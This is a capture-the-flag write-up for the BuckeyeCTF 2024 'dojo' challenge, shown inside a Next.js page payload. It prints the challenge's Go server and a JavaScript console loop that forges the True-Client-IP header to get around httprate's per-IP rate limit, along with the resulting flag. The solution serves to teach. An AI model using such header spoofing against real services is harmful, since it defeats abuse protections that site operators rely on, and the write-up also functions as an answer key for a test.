1:"$Sreact.fragment"
2:I[87555,[],""]
3:I[31295,[],""]
4:I[6874,["874","static/chunks/874-3e820bd666038662.js","633","static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js"],""]
6:I[59665,[],"OutletBoundary"]
8:I[74911,[],"AsyncMetadataOutlet"]
a:I[59665,[],"ViewportBoundary"]
c:I[59665,[],"MetadataBoundary"]
d:"$Sreact.suspense"
f:I[28393,[],""]
:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/5137b7a074c35308.css","style"]
0:{"P":null,"b":"sErSrOfutUclsW-VrC85j","p":"","c":["","writeups","b5f47ad77ea136d07cfaf15980fedf4c"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","b5f47ad77ea136d07cfaf15980fedf4c","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/5137b7a074c35308.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["id","b5f47ad77ea136d07cfaf15980fedf4c","d"],["$","$1","c",{"children":[null,[["$","$L4",null,{"href":"/writeups","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to writeups"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",null,["$","$L6",null,{"children":["$L7",["$","$L8",null,{"promise":"$@9"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$La",null,{"children":"$Lb"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$Lc",null,{"children":["$","div",null,{"hidden":true,"children":["$","$d",null,{"fallback":null,"children":"$Le"}]}]}]]}],false]],"m":"$undefined","G":["$f",[]],"s":false,"S":true}
b:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
7:null
10:I[50674,["263","static/chunks/bc9c3264-6371ca03223855d4.js","810","static/chunks/48507feb-8452885980bba250.js","330","static/chunks/08ffe114-f47006c90e36a3eb.js","800","static/chunks/800-bd0deb6e7b7e903a.js","134","static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js"],"default"]
11:T1f20,package server

import (
	"encoding/json"
	"math/rand/v2"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
	"github.com/go-chi/httprate"
	"github.com/go-chi/jwtauth/v5"
	"github.com/gorilla/websocket"
)

var TokenAuth *jwtauth.JWTAuth

const MaxBossHealth = 1000

type GameState struct {
	id           int32
	bossHealth   int32
	playerHealth int32
	plundered    int32
	lastDodge    time.Time

	conn *websocket.Conn
}

func (gs *GameState) SyncJSON() {
	if gs.conn != nil {
		gs.conn.WriteJSON(map[string]interface{}{
			"action":       "sync",
			"playerHealth": gs.playerHealth,
			"bossHealth":   gs.bossHealth,
		})
	}

	if gs.bossHealth <= 0 {
		if gs.conn != nil {
			gs.conn.WriteJSON(map[string]string{"action": "win"})

			if gs.plundered > 800 {
				flag, exists := os.LookupEnv("FLAG")
				if !exists {
					flag = "bctf{fake_flag}"
				}
				gs.conn.WriteJSON(map[string]string{"flag": flag})
			}

			gs.conn.Close()
		}

		delete(gameStates, gs.id)
	}

	if gs.playerHealth <= 0 {
		if gs.conn != nil {
			gs.conn.WriteJSON(map[string]string{"action": "lose", "reason": "died"})
			gs.conn.Close()
		}
		delete(gameStates, gs.id)
	}
}

func (gs *GameState) PlayerAttack() (success bool, amount int32) {
	if gs.lastDodge.Add(1 * time.Second).After(time.Now()) {
		return false, 0
	}

	amt := int32(rand.IntN(12) + 2)

	if gs.conn != nil {
		gs.conn.WriteJSON(map[string]interface{}{"action": "player_attack", "amount": amt})
	}

	gs.bossHealth -= amt
	gs.SyncJSON()
	return true, amt
}

func (gs *GameState) PlayerDodge() {
	gs.lastDodge = time.Now()
}

func (gs *GameState) PlayerPlunder() (bool, int32) {
	if gs.lastDodge.Add(1 * time.Second).After(time.Now()) {
		return false, 0
	}

	amount := int32(rand.IntN(12) + 2)
	gs.plundered += amount
	return true, amount
}

func (gs *GameState) BossAttack(amount int32) {
	if gs.lastDodge.Add(1 * time.Second).After(time.Now()) {
		if gs.conn != nil {
			gs.conn.WriteJSON(map[string]interface{}{"action": "dodged", "amount": amount})
		}
		return
	}

	gs.playerHealth -= amount

	if gs.conn != nil {
		gs.conn.WriteJSON(map[string]interface{}{"action": "boss_attack", "amount": amount})
	}
	gs.SyncJSON()
}

func (gs *GameState) BossSignalAttack() {
	if gs.conn != nil {
		gs.conn.WriteJSON(map[string]interface{}{"action": "signal"})
	}
}

func (gs *GameState) BossHeal(amount int32) {
	gs.bossHealth = min(gs.bossHealth+amount, MaxBossHealth)

	if gs.conn != nil {
		gs.conn.WriteJSON(map[string]interface{}{"action": "heal", "amount": amount})
	}
	gs.SyncJSON()
}

func (gs *GameState) TimeoutLose() {
	if gs.conn != nil {
		gs.conn.WriteJSON(map[string]string{"action": "lose", "reason": "timed out"})
		gs.conn.Close()
	}
	delete(gameStates, gs.id)
}

var gameStates = make(map[int32]*GameState)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin:     func(r *http.Request) bool { return os.Getenv("BF_PRODUCTION") != "true" },
}

func (s *Server) RegisterRoutes() http.Handler {
	r := chi.NewRouter()
	r.Use(middleware.Recoverer)
	r.Get("/", s.FrontendHandler)
	r.Get("/*", s.FrontendHandler)

	r.Group(func(r chi.Router) {
		r.Use(middleware.Logger)
		r.Use(middleware.Timeout(time.Second * 60))
		r.Use(httprate.LimitByRealIP(2, time.Second))
		r.Get("/api/new", s.NewGameHandler)

		r.Group(func(r chi.Router) {
			r.Use(jwtauth.Verifier(TokenAuth))
			r.Use(jwtauth.Authenticator(TokenAuth))

			r.Get("/api/attack", s.AttackHandler)
			r.Get("/api/dodge", s.DodgeHandler)
			r.Get("/api/plunder", s.PlunderHandler)
			r.Get("/api/ws", s.WebsocketHandler)
		})
	})

	return r
}

func (s *Server) FrontendHandler(w http.ResponseWriter, r *http.Request) {
	ext := filepath.Ext(r.URL.Path)

	// If there is no file extension, and it does not end with a slash,
	// assume it's an HTML file and append .html
	if ext == "" && !strings.HasSuffix(r.URL.Path, "/") {
		r.URL.Path += ".html"
	}

	http.FileServer(http.Dir("frontend/build")).ServeHTTP(w, r)
}

func (s *Server) AttackHandler(w http.ResponseWriter, r *http.Request) {
	_, claims, _ := jwtauth.FromContext(r.Context())
	game_id := int32(claims["game_id"].(float64))

	gameState := gameStates[game_id]
	if gameState == nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
		return
	}

	success, amount := gameState.PlayerAttack()
	if !success {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "You can't attack right now"})
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{"status": "success", "amount": amount})
}

func (s *Server) DodgeHandler(w http.ResponseWriter, r *http.Request) {
	_, claims, _ := jwtauth.FromContext(r.Context())
	game_id := int32(claims["game_id"].(float64))

	gameState := gameStates[game_id]
	if gameState == nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
		return
	}

	gameState.PlayerDodge()

	json.NewEncoder(w).Encode(map[string]interface{}{"status": "success"})
}

func (s *Server) PlunderHandler(w http.ResponseWriter, r *http.Request) {
	_, claims, _ := jwtauth.FromContext(r.Context())
	game_id := int32(claims["game_id"].(float64))

	gameState := gameStates[game_id]
	if gameState == nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
		return
	}

	success, amount := gameState.PlayerPlunder()
	if !success {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "You can't plunder right now"})
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "success",
		"amount": amount,
		"total":  gameState.plundered,
	})
}

func (s *Server) NewGameHandler(w http.ResponseWriter, r *http.Request) {
	gameId := rand.Int32()
	_, tokenString, _ := TokenAuth.Encode(map[string]interface{}{"game_id": gameId})

	gameStates[gameId] = &GameState{
		id:           gameId,
		bossHealth:   MaxBossHealth,
		playerHealth: 100,
	}

	cookie := http.Cookie{
		Name:     "jwt",
		Value:    tokenString,
		HttpOnly: false,
	}

	http.SetCookie(w, &cookie)

	go gameRunner(gameId)

	http.Redirect(w, r, "/play", http.StatusTemporaryRedirect)
}

func gameRunner(gameId int32) {
	s2 := rand.NewPCG(uint64(gameId), 1024)
	r2 := rand.New(s2)

	go func() {
		time.Sleep(60 * time.Second)

		gameState := gameStates[gameId]
		if gameState == nil {
			return
		}

		gameState.TimeoutLose()
	}()

	time.Sleep(3 * 1000 * time.Millisecond)

	for {
		time.Sleep(1000 * time.Millisecond)
		gameState := gameStates[gameId]
		if gameState == nil {
			return
		}

		v := r2.IntN(100)

		if v < 20 {
			if gameState.bossHealth < MaxBossHealth*0.8 {
				healAmount := int32(r2.IntN(50) + 20)
				gameState.BossHeal(healAmount)
			} else {
				damageAmount := int32(r2.IntN(30) + 5)
				gameState.BossAttack(damageAmount)
			}
		} else if v < 35 {
			gameState.BossSignalAttack()
			time.Sleep(1000 * time.Millisecond)
			damageAmount := int32(r2.IntN(50) + 10)
			gameState.BossAttack(damageAmount)
		} else if v < 50 {
			damageAmount := int32(r2.IntN(30) + 5)
			gameState.BossAttack(damageAmount)
		} else if v < 65 {
			gameState.BossSignalAttack()
		}
	}
}

func (s *Server) WebsocketHandler(w http.ResponseWriter, r *http.Request) {
	_, claims, _ := jwtauth.FromContext(r.Context())
	gameId := int32(claims["game_id"].(float64))

	gameState := gameStates[gameId]
	if gameState == nil {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	gameState.conn = conn
	gameState.SyncJSON()
}5:["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"BuckeyeCTF 2024 — dojo"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"The dojo stores many riches. Can you make it through the gauntlet?"}],"\n",["$","p","p-1",{"children":"dojo.challs.pwnoh.io"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a Go server looking like this:"}],"\n",["$","$L10","pre-0",{"className":"my-2","children":"$11","language":"go"}],"\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19","\n","$L1a","\n","$L1b","\n","$L1c","\n","$L1d","\n","$L1e","\n","$L1f","\n","$L20","\n","$L21","\n","$L22"]}]}]
12:["$","p","p-1",{"children":"Our goal is to plunder 800 emeralds, all while defeating the boss and not getting killed in the process."}]
13:["$","p","p-2",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/1f28d421-8fe1-45a5-9271-4fad8c6897bb","alt":"image"}]}]
14:["$","p","p-3",{"children":"Looking at the underlying logic for attacking, dodging, and plundering,"}]
15:["$","$L10","pre-1",{"className":"my-2","children":"func (gs *GameState) PlayerAttack() (success bool, amount int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\treturn false, 0\n\t}\n\n\tamt := int32(rand.IntN(12) + 2)\n\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"player_attack\", \"amount\": amt})\n\t}\n\n\tgs.bossHealth -= amt\n\tgs.SyncJSON()\n\treturn true, amt\n}\n\nfunc (gs *GameState) PlayerDodge() {\n\tgs.lastDodge = time.Now()\n}\n\nfunc (gs *GameState) PlayerPlunder() (bool, int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\treturn false, 0\n\t}\n\n\tamount := int32(rand.IntN(12) + 2)\n\tgs.plundered += amount\n\treturn true, amount\n}","language":"go"}]
16:["$","p","p-4",{"children":"it seems like attacking and plundering are only prevented after dodging, and don't block the spam of each other. Then, a preliminary idea can be to just spam plunder until we reach 800 emeralds, then spam attack until we kill the boss."}]
17:["$","p","p-5",{"children":"Unfortunately, referencing the route handler again,"}]
18:["$","$L10","pre-2",{"className":"my-2","children":"\tr.Group(func(r chi.Router) {\n\t\tr.Use(middleware.Logger)\n\t\tr.Use(middleware.Timeout(time.Second * 60))\n\t\tr.Use(httprate.LimitByRealIP(2, time.Second))\n\t\tr.Get(\"/api/new\", s.NewGameHandler)","language":"go"}]
19:["$","p","p-6",{"children":["it looks like our requests are ratelimited to 2 per second by ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"httprate.LimitByRealIP"}],"; naively spamming requests will return ",["$","code","code-1",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"429"}],"s and we'll still get defeated by the boss."]}]
1a:["$","p","p-7",{"children":["However, going to the ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"httprate"}]," source code,"]}]
1b:["$","$L10","pre-3",{"className":"my-2","children":"func LimitByRealIP(requestLimit int, windowLength time.Duration) func(next http.Handler) http.Handler {\n\treturn Limit(requestLimit, windowLength, WithKeyFuncs(KeyByRealIP))\n}\n\nfunc Key(key string) func(r *http.Request) (string, error) {\n\treturn func(r *http.Request) (string, error) {\n\t\treturn key, nil\n\t}\n}\n\nfunc KeyByIP(r *http.Request) (string, error) {\n\tip, _, err := net.SplitHostPort(r.RemoteAddr)\n\tif err != nil {\n\t\tip = r.RemoteAddr\n\t}\n\treturn canonicalizeIP(ip), nil\n}\n\nfunc KeyByRealIP(r *http.Request) (string, error) {\n\tvar ip string\n\n\tif tcip := r.Header.Get(\"True-Client-IP\"); tcip != \"\" {\n\t\tip = tcip\n\t} else if xrip := r.Header.Get(\"X-Real-IP\"); xrip != \"\" {\n\t\tip = xrip\n\t} else if xff := r.Header.Get(\"X-Forwarded-For\"); xff != \"\" {\n\t\ti := strings.Index(xff, \", \")\n\t\tif i == -1 {\n\t\t\ti = len(xff)\n\t\t}\n\t\tip = xff[:i]\n\t} else {\n\t\tvar err error\n\t\tip, _, err = net.SplitHostPort(r.RemoteAddr)\n\t\tif err != nil {\n\t\t\tip = r.RemoteAddr\n\t\t}\n\t}\n\n\treturn canonicalizeIP(ip), nil\n}","language":"go"}]
1c:["$","p","p-8",{"children":["it looks like the way they check the client's real IP is through reading the ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"True-Client-IP"}]," header. If we forge this header, then, we should be able to bypass their rate limiting and get the flag."]}]
1d:["$","p","p-9",{"children":"Occasionally, forged fetches still fail for whatever reason. Still, assuming most fetches still go through, we can spam attacks and plunders with the following console script:"}]
1e:["$","$L10","pre-4",{"className":"my-2","children":"let i = 0;\nwhile (true) {\n    try {\n        const { total } = await (await fetch('/api/plunder', {\n            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }\n        })).json();\n        if (total > 800) break;\n    } catch {}\n}\n\nlet health = 2000;\nwhile (health >= 0) {\n    try {\n        const { amount } = await (await fetch('/api/attack', {\n            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }\n        })).json();\n        health -= amount;\n    } catch {}\n}","language":"js"}]
1f:["$","p","p-10",{"children":["$","a","a-0",{"href":"https://gist.github.com/user-attachments/assets/f70ea636-2fe1-4ace-a8d2-204aac7b2f85","children":"dojo.webm"}]}]
20:["$","p","p-11",{"children":"Once we've won, all we need to do is check the websocket to get the flag:"}]
21:["$","p","p-12",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/c53bedee-58cf-47c3-9f7a-acecaa9c7019","alt":"image"}]}]
22:["$","$L10","pre-5",{"className":"my-2","children":"bctf{D3FAul7_rA73_l1m17_fUnc710N5_aR3_5caRy}","language":"$undefined"}]
9:{"metadata":[["$","title","0",{"children":"BuckeyeCTF 2024 — dojo | kevin.fish"}],["$","meta","1",{"name":"description","content":"The dojo stores many riches. Can you make it through the gauntlet?"}],["$","meta","2",{"property":"og:title","content":"BuckeyeCTF 2024 — dojo"}],["$","meta","3",{"property":"og:description","content":"The dojo stores many riches. Can you make it through the gauntlet?"}],["$","meta","4",{"name":"twitter:card","content":"summary"}],["$","meta","5",{"name":"twitter:title","content":"BuckeyeCTF 2024 — dojo"}],["$","meta","6",{"name":"twitter:description","content":"The dojo stores many riches. Can you make it through the gauntlet?"}]],"error":null,"digest":"$undefined"}
e:"$9:metadata"
